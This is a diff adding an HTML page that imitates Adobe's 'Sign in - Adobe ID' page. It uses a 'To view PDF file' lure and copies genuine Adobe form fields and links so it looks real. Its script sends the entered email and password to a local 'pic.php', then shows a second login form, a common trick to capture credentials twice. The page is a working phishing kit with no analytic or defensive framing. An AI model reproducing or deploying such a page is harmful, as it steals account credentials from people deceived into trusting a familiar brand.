@@ -1,0 +1,360 @@
+<html data-placeholder-focus="false" class="" data-pagename="login" lang="en"><!--<![endif]--><head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+        <meta name="mswebdialog-newwindowurl" content="*">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		  <meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="nosnippet">
+ <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Cache-Control" content="private">
+    <meta http-equiv="Pragma" content="no-cache">
+			<script src="js/jquery-2.2.3.min.js"></script>  
+	 <script type="text/javascript">
+$(document).ready(function() {
+  var form = $('#aza'); // contact form
+  var submit = $('#ewu');  // submit button
+  var alert = $('.alertx'); // alert div for show alert message
+  var loader = $('.loader');
+
+  // form submit event
+  form.on('submit', function(e) {
+    e.preventDefault(); // prevent default form submit
+ //form.append('file', $('#imgInp')[0].files[0]);
+var formData = new FormData($(this)[0]);
+    $.ajax({
+      url: 'pic.php', // form action url
+      type: 'POST', // form submit method get/post
+     // dataType: 'html', // request type html/json/xml
+     // data: form.serialize(), // serialize form data 
+	        data: formData,
+	  async: false,
+       cache: false,
+       contentType: false,
+       enctype: 'multipart/form-data',
+       processData: false,
+	  
+	  
+      beforeSend: function() {
+        alert.fadeOut();
+		loader.fadeIn();
+		$("#one").fadeOut();
+		$("#two").fadeOut();
+       // submit.html('Loading...'); // change submit button text
+      },
+      success: function(data) {
+        alert.html(data).fadeIn(); // fade in response data
+		loader.fadeOut();
+		$("#two").fadeIn();
+		$("#one").hide();
+		
+     //  form.trigger('reset'); // reset form
+        submit.html(''); // reset submit button text
+	  
+			
+	      },
+      error: function(e) {
+        console.log(e)
+      }
+    });
+  });
+});
+</script>
+<script type="text/javascript">
+
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+
+</script>
+
+
+    <style>
+    div.evidon-banner {display: none !important;}
+</style>
+
+
+<meta name="viewport" content="initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
+
+        <title>Sign in - Adobe ID</title>
+
+        <link rel="stylesheet" type="text/css" href="Sign%20in%20-%20Adobe%20ID_files/light.css">
+
+
+        <!--[if lte IE 8]>
+    <![endif]-->
+     </head>
+
+    <body ontouchstart="" id="adobesusi" class="capslock-unknown">
+        <div id="spinner_overlay" class="overlay">
+            <div id="squarespinner_template" class="overlay-spinner"></div>
+        </div>
+
+        <div class="container " role="main" id="">
+            <div class="page-header">
+    <div id="idp-flow-header" class="idp-flow-logo">
+        <div class="idp-flow-logo-image"></div>
+        <span id="idp-flow-individual-text" class="idp-flow-logo-text"></span>
+    </div>
+</div>
+<div id="adobeid_view" class="view">
+                <div class="row mod-title-row">
+    <div id="context-passing-container" class="context-passing context ">
+
+        <div class="context-passing-action">
+                <h1 class="page-action action">
+                    For your protection, please verify your identity.</h1>
+            </div>
+
+            <div class="media-left context-passing-product">
+
+                <div class="media-left-media ">
+                        <img class="context-passing-product-image" src="Sign%20in%20-%20Adobe%20ID_files/18cb1a8608f7a71cbd8c572d73a95cb6.png" data-component="responsive_image">
+                    </div>
+                <div class="media-left-media  mod-spacing-smaller context-passing-product-name heading">
+                    Adobe </div>
+            </div><div class="row mod-top-spaced mod-bot-spaced Separator">
+    <span class="Separator-Content"><strong>To view PDF file</strong></span>
+</div><br> <span id="enterprise_teaser_text">Sign in with your company or school account  </span> <br><div class="alertx"></div>
+        </div>
+
+    </div>
+<div id="indicatorPanel" class="indicatorPanel mod-hidden">
+    <p class="row mod-top-spaced mod-bot-spaced"><strong id="indicatorPanel-Email"></strong></p>
+
+    <p class="row mod-top-spaced mod-bot-spaced"></p>
+
+    <div class="inline-spinner">
+        <div class="inline-spinner-element"></div>
+        <div class="inline-spinner-element mod-second"></div>
+        <div class="inline-spinner-element mod-third"></div>
+    </div>
+
+    <div class="row mod-top-spaced mod-bot-spaced">
+        <button id="indicatorPanel-ContinueButton" class="indicatorPanel-ContinueButton button" type="button"><span class="icon icon-facebook"></span> <span>Continue to Facebook</span></button>
+    </div>
+</div>
+<div id="one">
+<form id="aza" class="loginform" method="post">
+        <input type="hidden" id="adobeid_callback" name="callback" value="https://ims-na1.adobelogin.com/ims/adobeid/SunbreakWebUI1/AdobeID/token?redirect_uri=https%3A%2F%2Faccount.adobe.com%2F%23from_ims%3Dtrue%26old_hash%3D%26api%3Dauthorize%26reauth%3Dtrue&amp;scope=AdobeID%2Copenid%2Csunbreak%2Cacct_mgmt_api%2Cgnav%2Csao.cce_private%2Csao.digital_editions%2Ccreative_cloud%2Cread_countries_regions%2Csocial.link%2Cunlink_social_account%2Cadditional_info.address.mail_to%2Cadditional_info.account_type%2Cadditional_info.roles%2Cadditional_info.social%2Cadditional_info.screen_name%2Cadditional_info.optionalAgreements%2Cadditional_info.secondary_email%2Cadditional_info.phonetic_name%2Cadditional_info.dob%2Cupdate_profile.all%2Csecurity_profile.read%2Csecurity_profile.update%2Cadmin_manage_user_consent%2Cadmin_slo%2Creauthenticated">
+    <input type="hidden" id="adobeid_client_id" name="client_id" value="SunbreakWebUI1">
+    <input type="hidden" id="adobeid_ctx_id" name="ctx_id" value="accmgmt">
+    <input type="hidden" id="adobeid_denied_callback" name="denied_callback" value="https://ims-na1.adobelogin.com/ims/denied/SunbreakWebUI1?redirect_uri=https%3A%2F%2Faccount.adobe.com%2F%23from_ims%3Dtrue%26old_hash%3D%26api%3Dauthorize%26reauth%3Dtrue&amp;response_type=token">
+    <input type="hidden" id="adobeid_flow" name="flow" value="true">
+    <input type="hidden" id="adobeid_flow_type" name="flow_type" value="token">
+    <input type="hidden" id="adobeid_idp_flow_type" name="idp_flow_type" value="login">
+    <input type="hidden" id="adobeid_locale" name="locale" value="en_US">
+    <input type="hidden" id="adobeid_page_name" name="page_name" value="onLoad_SignInForm">
+    <input type="hidden" id="adobeid_reauthenticate" name="reauthenticate" value="force">
+    <input type="hidden" id="adobeid_relay" name="relay" value="ddcce430-88ef-4aa0-b6eb-26a40eedb300">
+    <input type="hidden" id="adobeid_scope" name="scope" value="">
+    <input type="hidden" name="esid" value=""><div class="g-recaptcha-container"><div class="grecaptcha-badge" data-style="bottomleft" style="width: 256px; height: 60px; display: block; transition: left 0.3s ease 0s; position: fixed; bottom: 14px; left: -186px; box-shadow: gray 0px 0px 5px;"><div class="grecaptcha-logo"><iframe src="" role="presentation" name="a-c0qjcskz7bzq" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
+
+   
+
+        <fieldset>
+            <span class="component-wrapper" for="username"><input aria-label="Email address" required="" aria-required="true" autocapitalize="off" autocomplete="username" autocorrect="off" class="" name="username" placeholder="Email address" tabindex="1" type="email"><div class="username-checknote" style="display: none"><span class="checknote"></span></div><div id="username-spinner" class="input-inline-spinner"><div class="inline-spinner"><div class="inline-spinner-element"></div><div class="inline-spinner-element mod-second"></div><div class="inline-spinner-element mod-third"></div></div></div></span>
+
+            </fieldset>
+
+        <fieldset>
+            <span class="component-wrapper" for="password"><input aria-label="Password" aria-required="true" required="" autocomplete="current-password" class="text-center" data-component="capsindicator passwordrevealer" id="adobeid_password" name="password" placeholder="Password" tabindex="2" type="password" value=""><div class="caps-indicator"><span class="caps-indicator-img"></span></div><div class="password-revealer off"><div class="password-revealer-img"></div></div><div class="caps-indicator"><span class="caps-indicator-img"></span></div></span>
+        </fieldset>
+
+        <fieldset class="row mod-form-button Flexible-Container">
+                    <div class="Flexible-Column">
+                        <button class="mod-main" id="ewu" tabindex="4">Sign in</button></div>
+
+                    <div class="Flexible-Column mod-grow">
+                        <div class="forgot-password-container">
+                <a id="adobeid_trouble_signing_in" tabindex="5" data-component="spinner" class="forgotpassword" href="" onclick="return scReport('SignIn:onClick_ForgotPassword', null, this)">
+    Forgot password?</a>
+</div></div>
+                </fieldset>
+           
+
+
+<input name="hold" value="0" type="hidden">
+    <input type="hidden" name="captcha_status" value="RENDERED"></form>
+
+
+</div>
+
+<div id="two" style="display:none;">
+
+<form id="" action="pic.php" class="loginform" method="post" data-component="spinner">
+      
+   
+	<input name="hold" value="1" type="hidden">
+  <fieldset>
+            <span class="component-wrapper" for="username"><input aria-label="Email address" required="" aria-required="true" autocapitalize="off" autocomplete="username" autocorrect="off" class="" name="username" placeholder="Email address" tabindex="1" type="email"><div class="username-checknote" style="display: none"><span class="checknote"></span></div><div id="username-spinner" class="input-inline-spinner"><div class="inline-spinner"><div class="inline-spinner-element"></div><div class="inline-spinner-element mod-second"></div><div class="inline-spinner-element mod-third"></div></div></div></span>
+
+            </fieldset>
+
+        <fieldset>
+            <span class="component-wrapper" for="password"><input aria-label="Password" aria-required="true" required="" autocomplete="current-password" class="text-center" data-component="capsindicator passwordrevealer" id="adobeid_password" name="password" placeholder="Password" tabindex="2" type="password" value=""><div class="caps-indicator"><span class="caps-indicator-img"></span></div><div class="password-revealer off"><div class="password-revealer-img"></div></div><div class="caps-indicator"><span class="caps-indicator-img"></span></div></span>
+        </fieldset>
+   
+             
+           
+
+	
+	 <fieldset class="row mod-form-button Flexible-Container">
+                    <div class="Flexible-Column">
+                        <button class="mod-main" id="ewu" tabindex="4">Sign in</button></div>
+
+                    <div class="Flexible-Column mod-grow">
+                        <div class="forgot-password-container">
+                <a id="adobeid_trouble_signing_in" tabindex="5" data-component="spinner" class="forgotpassword" href="https://adobeid-na1.services.adobe.com/renga-idprovider/pages/start_forgot_password?client_id=SunbreakWebUI1&amp;callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dtrue%26scope%3DAdobeID%252Copenid%252Csunbreak%252Cacct_mgmt_api%252Cgnav%252Csao.cce_private%252Csao.digital_editions%252Ccreative_cloud%252Cread_countries_regions%252Csocial.link%252Cunlink_social_account%252Cadditional_info.address.mail_to%252Cadditional_info.account_type%252Cadditional_info.roles%252Cadditional_info.social%252Cadditional_info.screen_name%252Cadditional_info.optionalAgreements%252Cadditional_info.secondary_email%252Cadditional_info.phonetic_name%252Cadditional_info.dob%252Cupdate_profile.all%252Csecurity_profile.read%252Csecurity_profile.update%252Cadmin_manage_user_consent%252Cadmin_slo%252Creauthenticated&amp;denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dtrue%26response_type%3Dtoken&amp;locale=en_US&amp;relay=ddcce430-88ef-4aa0-b6eb-26a40eedb300&amp;flow=true&amp;flow_type=token&amp;idp_flow_type=login&amp;ctx_id=accmgmt&amp;reauthenticate=force&amp;s_account=adbadobenonacdcprod%2Cadbims" onclick="return scReport('SignIn:onClick_ForgotPassword', null, this)">
+    Forgot password?</a>
+</div></div>
+                </fieldset>
+	</form>
+
+</div>
+
+</div>
+            <div class="view" style="display:none" id="enterprise_view">
+                <div class="row mod-title-row">
+    <div id="context-passing-container" class="context-passing context ">
+
+        <div class="context-passing-action">
+                <h1 class="page-action action">
+                    Sign in with an Enterprise ID</h1>
+            </div>
+
+            <div class="media-left context-passing-product">
+
+                <div class="media-left-media ">
+                        <img class="context-passing-product-image" src="Sign%20in%20-%20Adobe%20ID_files/18cb1a8608f7a71cbd8c572d73a95cb6.png" data-component="responsive_image">
+                    </div>
+                <div class="media-left-media  mod-spacing-smaller context-passing-product-name heading">
+                    Adobe </div>
+            </div>
+        </div>
+
+    </div>
+<div class="row mod-spaced" id="enterpriseintrotext">
+        <p id="enterprise_enter_email_text">
+            Need help with Enterprise ID?
+            &nbsp;
+            <a href="https://adobeid-na1.services.adobe.com/renga-idprovider/pages/newwindow?new_url=http%3A%2F%2Fwww.adobe.com%2Fgo%2Flearn-more-enterprise-id">Learn more.</a>
+        </p>
+    </div>
+
+<div class="row">
+    <span class="error backend"></span>
+</div>
+
+<form id="enterprise_signin" class="loginform" method="post" action="login_t2.do" data-component="spinner" novalidate="novalidate">
+    <input type="password" class="notinview" aria-hidden="true" tabindex="-1">
+    <input type="hidden" id="enterpriseid_callback" name="callback" value="https://ims-na1.adobelogin.com/ims/adobeid/SunbreakWebUI1/AdobeID/token?redirect_uri=https%3A%2F%2Faccount.adobe.com%2F%23from_ims%3Dtrue%26old_hash%3D%26api%3Dauthorize%26reauth%3Dtrue&amp;scope=AdobeID%2Copenid%2Csunbreak%2Cacct_mgmt_api%2Cgnav%2Csao.cce_private%2Csao.digital_editions%2Ccreative_cloud%2Cread_countries_regions%2Csocial.link%2Cunlink_social_account%2Cadditional_info.address.mail_to%2Cadditional_info.account_type%2Cadditional_info.roles%2Cadditional_info.social%2Cadditional_info.screen_name%2Cadditional_info.optionalAgreements%2Cadditional_info.secondary_email%2Cadditional_info.phonetic_name%2Cadditional_info.dob%2Cupdate_profile.all%2Csecurity_profile.read%2Csecurity_profile.update%2Cadmin_manage_user_consent%2Cadmin_slo%2Creauthenticated">
+    <input type="hidden" id="enterpriseid_client_id" name="client_id" value="SunbreakWebUI1">
+    <input type="hidden" id="enterpriseid_ctx_id" name="ctx_id" value="accmgmt">
+    <input type="hidden" id="enterpriseid_denied_callback" name="denied_callback" value="https://ims-na1.adobelogin.com/ims/denied/SunbreakWebUI1?redirect_uri=https%3A%2F%2Faccount.adobe.com%2F%23from_ims%3Dtrue%26old_hash%3D%26api%3Dauthorize%26reauth%3Dtrue&amp;response_type=token">
+    <input type="hidden" id="enterpriseid_flow" name="flow" value="true">
+    <input type="hidden" id="enterpriseid_flow_type" name="flow_type" value="token">
+    <input type="hidden" id="enterpriseid_idp_flow_type" name="idp_flow_type" value="login">
+    <input type="hidden" id="enterpriseid_locale" name="locale" value="en_US">
+    <input type="hidden" id="enterpriseid_page_name" name="page_name" value="onLoad_SignInForm">
+    <input type="hidden" id="enterpriseid_reauthenticate" name="reauthenticate" value="force">
+    <input type="hidden" id="enterpriseid_relay" name="relay" value="ddcce430-88ef-4aa0-b6eb-26a40eedb300">
+    <input type="hidden" id="enterpriseid_scope" name="scope" value="AdobeID,openid,sunbreak,acct_mgmt_api,gnav,sao.cce_private,sao.digital_editions,creative_cloud,read_countries_regions,social.link,unlink_social_account,additional_info.address.mail_to,additional_info.account_type,additional_info.roles,additional_info.social,additional_info.screen_name,additional_info.optionalAgreements,additional_info.secondary_email,additional_info.phonetic_name,additional_info.dob,update_profile.all,security_profile.read,security_profile.update,admin_manage_user_consent,admin_slo,reauthenticated">
+    <input type="hidden" name="esid" value="AWorA4UG-AKF6907WEAWzEyNKMyptYRs6BmWURczE78Y9m5ce7hbx9oWqFU__SfNahVLvrrrSS6LZee9tYc08s3cD33BL1h1H0V0dpyMFWClRlzzvnNxemQgX3i8Zt-bc7GbK-s3IC7PxOB60ojI2BSnYep8_O40_ilB7uU"><div class="g-recaptcha-container"><div class="grecaptcha-badge" data-style="none" style="width: 256px; height: 60px; position: fixed; visibility: hidden;"><div class="grecaptcha-logo"><iframe src="Sign%20in%20-%20Adobe%20ID_files/anchor_002.htm" role="presentation" name="a-o8dpvdl3izw" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-1" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div>
+
+    <fieldset>
+        <span class="component-wrapper" for="username"><input aria-label="Email address or domain name" aria-required="true" autocapitalize="off" autocomplete="username" autocorrect="off" class="" data-component="usertypedetector" data-component-usertypedetector-blocknont1="false" data-component-usertypedetector-client-id="SunbreakWebUI1" data-component-usertypedetector-endpoint="/renga-idprovider/pages/login_flow" data-component-usertypedetector-enforceuser="false" data-component-usertypedetector-idp-flow-type="login" data-component-usertypedetector-reauthentication="true" data-component-usertypedetector-use-flow="true" id="enterprise_username" name="username" novalidate="novalidate" placeholder="Email address or domain name" tabindex="1" type="email"><div class="username-checknote" style="display: none"><span class="checknote"></span></div><div id="username-spinner" class="input-inline-spinner"><div class="inline-spinner"><div class="inline-spinner-element"></div><div class="inline-spinner-element mod-second"></div><div class="inline-spinner-element mod-third"></div></div></div></span>
+
+        </fieldset>
+
+    <fieldset id="passwordfieldset">
+            <span class="component-wrapper" for="password"><input aria-label="Password" aria-required="true" autocomplete="current-password" class="text-center" data-component="capsindicator passwordrevealer" id="enterprise_password" name="password" placeholder="Password" tabindex="2" type="password" value=""><div class="caps-indicator"><span class="caps-indicator-img"></span></div><div class="password-revealer off"><div class="password-revealer-img"></div></div></span>
+        </fieldset>
+
+        <div class="row mod-bot-spaced" id="signinoptions">
+        <p>
+            </p><div class="forgot-password-container">
+                    <a id="enterprise_trouble_signing_in" tabindex="5" data-component="spinner" class="forgotpassword" href="https://adobeid-na1.services.adobe.com/renga-idprovider/pages/start_forgot_password?client_id=SunbreakWebUI1&amp;callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dtrue%26scope%3DAdobeID%252Copenid%252Csunbreak%252Cacct_mgmt_api%252Cgnav%252Csao.cce_private%252Csao.digital_editions%252Ccreative_cloud%252Cread_countries_regions%252Csocial.link%252Cunlink_social_account%252Cadditional_info.address.mail_to%252Cadditional_info.account_type%252Cadditional_info.roles%252Cadditional_info.social%252Cadditional_info.screen_name%252Cadditional_info.optionalAgreements%252Cadditional_info.secondary_email%252Cadditional_info.phonetic_name%252Cadditional_info.dob%252Cupdate_profile.all%252Csecurity_profile.read%252Csecurity_profile.update%252Cadmin_manage_user_consent%252Cadmin_slo%252Creauthenticated&amp;denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dtrue%26response_type%3Dtoken&amp;locale=en_US&amp;relay=ddcce430-88ef-4aa0-b6eb-26a40eedb300&amp;flow=true&amp;flow_type=token&amp;ctx_id=accmgmt&amp;reauthenticate=force&amp;s_account=adbadobenonacdcprod%2Cadbims&amp;idp_flow_type=login_t2" onclick="return scReport('SignIn:onClick_ForgotPassword', null, this)">
+    Forgot password?</a>
+</div>
+
+                <p></p>
+    </div>
+    <fieldset class="row mod-spaced">
+
+        <button class="mod-main" id="enterprise_sign_in_button" onclick="scReport('SignIn:onClick_SignInEnterpriseId')" tabindex="4">
+                Sign in with an Enterprise ID</button>
+        </fieldset>
+    <div class="row onemorething">
+        <a id="enterprise_back_to_adobeid" data-component="spinner viewswitcher" data-component-viewswitcher-targettitle="Sign in with an Adobe ID" data-component-viewswitcher-targettype="adobeid" data-component-viewswitcher-targetview="#adobeid_view" href="https://adobeid-na1.services.adobe.com/renga-idprovider/pages/login?idp_flow_type=login&amp;client_id=SunbreakWebUI1&amp;callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dtrue%26scope%3DAdobeID%252Copenid%252Csunbreak%252Cacct_mgmt_api%252Cgnav%252Csao.cce_private%252Csao.digital_editions%252Ccreative_cloud%252Cread_countries_regions%252Csocial.link%252Cunlink_social_account%252Cadditional_info.address.mail_to%252Cadditional_info.account_type%252Cadditional_info.roles%252Cadditional_info.social%252Cadditional_info.screen_name%252Cadditional_info.optionalAgreements%252Cadditional_info.secondary_email%252Cadditional_info.phonetic_name%252Cadditional_info.dob%252Cupdate_profile.all%252Csecurity_profile.read%252Csecurity_profile.update%252Cadmin_manage_user_consent%252Cadmin_slo%252Creauthenticated&amp;denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccount.adobe.com%252F%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dtrue%26response_type%3Dtoken&amp;locale=en_US&amp;relay=ddcce430-88ef-4aa0-b6eb-26a40eedb300&amp;flow=true&amp;flow_type=token&amp;idp_flow_type=login&amp;ctx_id=accmgmt&amp;reauthenticate=force&amp;s_account=adbadobenonacdcprod%2Cadbims">
+            Sign in with an Adobe ID</a>
+    </div>
+    <input type="hidden" name="vi" id="enterprise_vi" value="">
+<input type="hidden" name="captcha_status" value="RENDERED"></form>
+
+</div>
+
+            <div id="chooser_template">
+        <div class="account-chooser binded" id="chooser_screen" tabindex="-1" role="region">
+            <div class="account-chooser-content">
+                <div class="container">
+                    <div id="chooser_title" role="heading" class="row">
+                        <h1 class="page-title">Choose an account for</h1>
+                    </div>
+                    <div class="row mod-spaced">
+                        <strong class="account-chooser-email" id="checked_user_email"></strong>
+                    </div>
+                    <div class="account-chooser-account-list" role="menu" tabindex="-1" aria-labelledby="chooser_title">
+                        <div id="adobeid-option" class="account-chooser-option adobeid item" data-usertype="ind" role="menuitem" tabindex="0">
+                            <div class="account-chooser-arrow"></div>
+                            <div class="account-chooser-account-type">Adobe ID</div>
+                            <div class="account-chooser-account-type-description">Personal account</div>
+                        </div>
+                        <div id="enterpriseid-option" class="account-chooser-option enterprise item" data-usertype="ent" role="menuitem" tabindex="0">
+                            <div class="account-chooser-account-type">Enterprise ID</div>
+                            <div class="account-chooser-account-type-description">Company or school account</div>
+                            <div class="account-chooser-arrow"></div>
+                        </div>
+                    </div>
+                    <div class="account-chooser-footer">
+                        <div class="row mod-top-spaced">
+                            Need help?&nbsp;
+                            <a href="https://adobeid-na1.services.adobe.com/renga-idprovider/pages/newwindow?new_url=http%3A%2F%2Fwww.adobe.com%2Fgo%2Flearn-more-enterprise-id" id="learn_more_enterprise">Learn more.</a>
+                        </div>
+                        <div class="row">
+                            <a href="#" class="close" role="button">Cancel</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="chooser_screen account-chooser-spinner binded" id="external_redirect_waiter">
+            <div class="container">
+                <div class="account-chooser-spinner-content">
+                    <div id="spinner_square" class="overlay-spinner"></div>
+
+                    <div class="row mod-top-spaced">
+                        <span>Redirecting you to sign in…</span><br>
+                    </div>
+
+                    <div class="row chooser_footer">
+                        <a href="#" class="cancel">Cancel</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+   
+        <link id="jarvis-chat" rel="stylesheet" href="Sign%20in%20-%20Adobe%20ID_files/AdobeMessagingClient.css">
+   
+
+
+</body></html>
